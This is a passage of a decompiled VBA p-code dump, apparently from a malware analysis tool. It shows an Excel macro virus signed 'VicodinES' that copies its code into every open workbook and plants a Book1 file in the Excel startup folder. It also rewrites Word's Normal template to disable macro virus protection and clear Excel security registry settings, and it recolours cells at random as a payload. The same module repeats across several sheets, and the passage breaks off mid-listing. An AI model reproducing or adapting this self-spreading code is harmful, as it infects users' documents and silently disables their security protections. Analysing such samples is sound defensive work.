' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet2 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet3 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
